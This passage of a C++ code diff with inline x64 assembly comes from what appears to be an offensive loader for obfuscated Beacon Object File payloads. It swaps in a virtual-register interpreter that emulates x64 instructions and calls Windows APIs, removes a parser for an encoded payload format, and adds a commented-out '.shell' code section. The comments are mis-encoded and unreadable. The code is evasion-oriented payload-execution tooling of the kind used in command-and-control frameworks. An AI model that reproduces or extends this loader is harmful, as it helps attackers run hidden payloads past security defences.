+                    // –Èƒ‚ºƒ¥Ê∆˜ ∏≤∏« ’Ê µºƒ¥Ê∆˜
+                    mov rax, qword ptr[vtRegs]
+                    mov rbx, qword ptr[rax + 0x08]
+                    mov rcx, qword ptr[rax + 0x10]
+                    mov rdx, qword ptr[rax + 0x18]
+                    mov rsi, qword ptr[rax + 0x20]
+                    mov rdi, qword ptr[rax + 0x28]
+                    mov r8, qword ptr[rax + 0x30]
+                    mov r9, qword ptr[rax + 0x38]
+                    mov r10, qword ptr[rax + 0x40]
+                    mov r11, qword ptr[rax + 0x48]
+                    mov r12, qword ptr[rax + 0x50]
+                    mov r13, qword ptr[rax + 0x58]
+                    mov r14, qword ptr[rax + 0x60]
+                    mov r15, qword ptr[rax + 0x68]
+                    mov rsp, qword ptr[rax + 0x70]
+                    mov rax, qword ptr[rax]
+                    // µ˜”√ Windows API
+                    call callAddr
+                    // ’Ê µºƒ¥Ê∆˜ ∏≤∏« –Èƒ‚ºƒ¥Ê∆˜
+                    push rax
+                    mov rax, qword ptr[vtRegs]
+                    mov qword ptr[rax + 0x08], rbx
+                    mov qword ptr[rax + 0x10], rcx
+                    mov qword ptr[rax + 0x18], rdx
+                    mov qword ptr[rax + 0x20], rsi
+                    mov qword ptr[rax + 0x28], rdi
+                    mov qword ptr[rax + 0x30], r8
+                    mov qword ptr[rax + 0x38], r9
+                    mov qword ptr[rax + 0x40], r10
+                    mov qword ptr[rax + 0x48], r11
+                    mov qword ptr[rax + 0x50], r12
+                    mov qword ptr[rax + 0x58], r13
+                    mov qword ptr[rax + 0x60], r14
+                    mov qword ptr[rax + 0x68], r15
+                    pop rbx
+                    mov qword ptr[rax + 0x70], rsp
+                    mov qword ptr[rax], rbx
+                    // ªπ‘≠’Ê µ’ª∂•
+                    mov rsp, realRSP
+                }
+            }
+        }
+        else if (mnemonicIndex == retIndex) {
+            vtRegs[16] = *(PDWORD_PTR)vtRegs[14];
+            vtRegs[14] += sizeof(DWORD_PTR);
+        }
+        else if (mnemonicIndex == movzxIndex) {
+            __asm {
+                mov r10, qword ptr[opAddr1]
+                mov r11, qword ptr[r10]
+                mov r12, qword ptr[opAddr2]
+                mov r12, qword ptr[r12]
+            }
+            if (opBit1 == 'q' || opBit1 == 'd') {
+                if (opBit2 == 'w') {
+                    __asm {
+                        movzx r11, r12w
                     }
                 }
                 else {
-                    throw exception("Can not reloc.");
+                    __asm {
+                        movzx r11, r12b
+                    }
                 }
             }
+            else {
+                __asm {
+                    movzx r11w, r12b
+                }
+            }
+            __asm {
+                mov qword ptr[r10], r11
+            }
         }
-        relocIndex++;
+        else if (mnemonicIndex == movsxdIndex) {
+            *(PDWORD64)opAddr1 = *(PDWORD)opAddr2;
+        }
+        else if (mnemonicIndex == cmpIndex) {
+            __asm {
+                mov r11, qword ptr[opAddr1]
+                mov r11, qword ptr[r11]
+                mov r12, qword ptr[opAddr2]
+                mov r12, qword ptr[r12]
+                // opBit1 == 'q'
+                movsx eax, byte ptr[opBit1]
+                cmp eax, 0x71
+                jne checkDWORD
+                cmp r11, r12
+                jmp setEFL
+                // opBit1 == 'd'
+                checkDWORD:
+                cmp eax, 0x64
+                jne checkWORD
+                cmp r11d, r12d
+                jmp setEFL
+                // opBit1 == 'w'
+                checkWORD:
+                cmp eax, 0x77
+                jne checkBYTE
+                cmp r11w, r12w
+                jmp setEFL
+                // opBit1 == 'b'
+                checkBYTE:
+                cmp r11b, r12b
+                setEFL:
+                pushf
+                pop rax
+                mov rbx, qword ptr[vtRegs]
+                mov qword ptr[rbx + 0x88], rax // vtEFL
+            }
+        }
+        else if (mnemonicIndex == testIndex) {
+            __asm {
+                mov r11, qword ptr[opAddr1]
+                mov r11, qword ptr[r11]
+                mov r12, qword ptr[opAddr2]
+                mov r12, qword ptr[r12]
+                // opBit1 == 'q'
+                movsx eax, byte ptr[opBit1]
+                cmp eax, 0x71
+                jne checkDWORD
+                test r11, r12
+                jmp setEFL
+                // opBit1 == 'd'
+                checkDWORD:
+                cmp eax, 0x64
+                jne checkWORD
+                test r11d, r12d
+                jmp setEFL
+                // opBit1 == 'w'
+                checkWORD:
+                cmp eax, 0x77
+                jne checkBYTE
+                test r11w, r12w
+                jmp setEFL
+                // opBit1 == 'b'
+                checkBYTE:
+                test r11b, r12b
+                setEFL:
+                pushf
+                pop rax
+                mov rbx, qword ptr[vtRegs]
+                mov qword ptr[rbx + 0x88], rax // vtEFL
+            }
+        }
+        else if (mnemonicIndex == shlIndex) {
+            if (opBit1 == 'q') {
+                *(PDWORD64)opAddr1 <<= *(PDWORD64)opAddr2;
+            }
+            else if (opBit1 == 'd') {
+                if (opType1 == 'r') {
+                    *(PDWORD_PTR)opAddr1 = *(PDWORD)opAddr1 << *(PDWORD)opAddr2;
+                }
+                else {
+                    *(PDWORD)opAddr1 <<= *(PDWORD)opAddr2;
+                }
+            }
+            else if (opBit1 == 'w') {
+                *(PWORD)opAddr1 <<= *(PWORD)opAddr2;
+            }
+            else if (opBit1 == 'b') {
+                *(PBYTE)opAddr1 <<= *(PBYTE)opAddr2;
+            }
+        }
+        else if (mnemonicIndex == shrIndex) {
+            if (opBit1 == 'q') {
+                *(PDWORD64)opAddr1 >>= *(PDWORD64)opAddr2;
+            }
+            else if (opBit1 == 'd') {
+                if (opType1 == 'r') {
+                    *(PDWORD_PTR)opAddr1 = *(PDWORD)opAddr1 >> *(PDWORD)opAddr2;
+                }
+                else {
+                    *(PDWORD)opAddr1 >>= *(PDWORD)opAddr2;
+                }
+            }
+            else if (opBit1 == 'w') {
+                *(PWORD)opAddr1 >>= *(PWORD)opAddr2;
+            }
+            else if (opBit1 == 'b') {
+                *(PBYTE)opAddr1 >>= *(PBYTE)opAddr2;
+            }
+        }
     }
-    return op;
+
+    if (vtRegs[16] != vtRIP) {
+        return 1;
+    }
+    return 0;
 }
 
-// Ëß£Êûê Payload
-void ParsePayload(char* payload, int payloadLength, BofPayload& bofPayload) {
-    // ÊèêÂèñ BOF ÂáΩÊï∞ÂÅèÁßª + .text ÈáçÂÆö‰ΩçÂêçÁß∞ + Ê∑∑Ê∑ÜÊò†Â∞Ñ + Ëá™ÂÆö‰πâÊ±áÁºñ + .rdata
-    int bofFuncOffsetDictLength = strlen(payload);
-    bofPayload.bofFuncOffsetMap = (json::parse(payload)).get<map<string, int>>();
-    // cout << "BofFuncOffsetMap:\n" << payload << endl; // Ë∞ÉËØï
+/*
+#pragma code_seg(".shell$3")
 
-    char* textRelocNameList = payload + bofFuncOffsetDictLength + 1;
-    int textRelocNameListLength = strlen(textRelocNameList);
-    vector<string> textRelocNameVector = json::parse(textRelocNameList);
-    // cout << "TextRelocNameVector:\n" << textRelocNameList << endl; // Ë∞ÉËØï
-
-    char* obfDict = textRelocNameList + textRelocNameListLength + 1;
-    int obfDictLength = strlen(obfDict);
-    map<string, string> obfDictMap = (json::parse(obfDict)).get<map<string, string>>();
-    bofPayload.obfMap = (char*)malloc(sizeof(char) * 130);
-    for (const auto& pair : obfDictMap) {
-        bofPayload.obfMap[*pair.first.c_str()] = pair.second[0];
+// ±£÷§’ºŒª‘⁄ .shell ÷√µ◊
+__attribute__((naked)) void Placeholding2() {
+    __asm {
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
     }
-    // cout << "ObfDict:\n" << obfDict << endl; // Ë∞ÉËØï
-
-    char* selfAsmOriginal = obfDict + obfDictLength + 1;
-    int selfAsmSize = strlen(selfAsmOriginal);
-    bofPayload.selfAsm = (char*)malloc(selfAsmSize + 1);
-    memcpy(bofPayload.selfAsm, selfAsmOriginal, selfAsmSize + 1);
-    // cout << "SelfAsm:\n" << bofPayload.selfAsm << endl; // Ë∞ÉËØï
-
-    bofPayload.rdataLength = payloadLength - bofFuncOffsetDictLength - textRelocNameListLength - obfDictLength - selfAsmSize - 4;
-    bofPayload.pRdata = malloc(bofPayload.rdataLength);
-    memcpy(bofPayload.pRdata, selfAsmOriginal + selfAsmSize + 1, bofPayload.rdataLength);
-    // cout << "pRdata:\n" << bofPayload.pRdata << endl; // Ë∞ÉËØï
-
-    // Ëß£ÊûêËá™ÂÆö‰πâÊ±áÁºñ & .text ÈáçÂÆö‰Ωç
-    for (int i = 0; i < selfAsmSize; i++) {
-        if (*(bofPayload.selfAsm + i) == bofPayload.obfMap['_']) {
-            *(bofPayload.selfAsm + i) = '\0';
-        }
-    }
-    int index = 0;
-    int offset = 0;
-    int relocIndex = 0;
-    while (*(bofPayload.selfAsm + offset) != '\0') {
-        // ËôöÊãüÂú∞ÂùÄ
-        char* endPtr;
-        DWORD_PTR vtAddr = strtoull(bofPayload.selfAsm + offset, &endPtr, 16);
-        if (*endPtr != '\0') {
-            throw exception("VtAddr incorrect.");
-        }
-        offset += strlen(bofPayload.selfAsm + offset) + 1;
-        bofPayload.vtAddrMap[index] = vtAddr;
-        bofPayload.indexMap[vtAddr] = index;
-
-        SelfAsm* pCurrentSelfAsm = (SelfAsm*)malloc(sizeof(SelfAsm));
-
-        // Âä©ËÆ∞Á¨¶Â∫èÂè∑
-        pCurrentSelfAsm->mnemonicIndex = atoi(bofPayload.selfAsm + offset);
-        offset += strlen(bofPayload.selfAsm + offset) + 1;
-
-        // Êìç‰ΩúÊï∞1 ‰ΩçÊï∞
-        pCurrentSelfAsm->opBit1 = bofPayload.selfAsm + offset;
-        offset += strlen(bofPayload.selfAsm + offset) + 1;
-
-        // Êìç‰ΩúÊï∞1
-        pCurrentSelfAsm->op1 = TextReloc(bofPayload.selfAsm + offset, relocIndex, textRelocNameVector, bofPayload);
-        offset += strlen(bofPayload.selfAsm + offset) + 1;
-
-        // Êìç‰ΩúÊï∞2 ‰ΩçÊï∞
-        pCurrentSelfAsm->opBit2 = bofPayload.selfAsm + offset;
-        offset += strlen(bofPayload.selfAsm + offset) + 1;
-
-        // Êìç‰ΩúÊï∞2
-        pCurrentSelfAsm->op2 = TextReloc(bofPayload.selfAsm + offset, relocIndex, textRelocNameVector, bofPayload);
-        offset += strlen(bofPayload.selfAsm + offset) + 1;
-
-        bofPayload.selfAsmMap[vtAddr] = pCurrentSelfAsm;
-        index++;
-    }
-    bofPayload.selfAsmLength = index;
-    textRelocNameVector.clear();
-
-    // Ë∞ÉËØï
-    /*cout << "SelfAsmLength: " << bofPayload.selfAsmLength << endl;
-    for (int index = 0; index < bofPayload.selfAsmLength; index++) {
-        cout << "Index: " << bofPayload.indexMap[bofPayload.vtAddrMap[index]];
-        cout << " VtAddr: " << hex << bofPayload.vtAddrMap[index];
-        SelfAsm* pSelfAsm = bofPayload.selfAsmMap[bofPayload.vtAddrMap[index]];
-        cout << " MnemonicIndex: " << dec << pSelfAsm->mnemonicIndex;
-        cout << " OpBit1: " << pSelfAsm->opBit1;
-        cout << " Op1: " << pSelfAsm->op1;
-        cout << " OpBit2: " << pSelfAsm->opBit2;
-        cout << " Op2: " << pSelfAsm->op2 << endl;
-    }*/
-}
+}*/
